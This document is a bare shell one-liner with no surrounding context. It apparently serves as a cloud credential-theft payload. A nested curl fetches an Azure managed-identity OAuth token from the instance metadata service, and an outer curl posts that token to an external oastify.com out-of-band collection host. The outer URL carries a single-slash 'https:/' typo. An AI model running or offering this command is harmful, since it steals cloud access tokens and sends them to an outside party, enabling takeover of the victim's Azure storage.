      curl -d "`curl -H 'Metadata: true' http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-12-13\&resource=https://storage.azure.com/`" https:/cm2s0p9e3bvsqv1ihnzc379vnmtjv7nvc.oastify.com
